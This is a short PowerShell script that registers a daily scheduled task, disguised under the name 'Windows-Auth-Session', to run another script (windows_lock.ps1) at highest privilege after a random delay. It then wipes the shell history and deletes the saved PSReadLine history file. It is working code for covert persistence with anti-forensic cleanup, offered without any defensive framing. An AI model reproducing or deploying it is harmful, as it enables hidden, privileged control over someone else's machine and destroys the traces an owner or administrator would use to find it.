# *** FILEPATH NEEDS ALTERING ***

$jobName = 'Windows-Auth-Session'
$actionScript = '-File ".\windows_lock.ps1"'
$rand = Get-Random -Minimum 5 -Maximum 30
$act = New-ScheduledTaskAction -Execute "powershell" -Argument $actionScript
$trig = New-ScheduledTaskTrigger -Daily -At ((get-date).addminutes($rand))

Register-ScheduledTask -TaskName $jobName -Action $act -Trigger $trig -RunLevel Highest

Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath
cls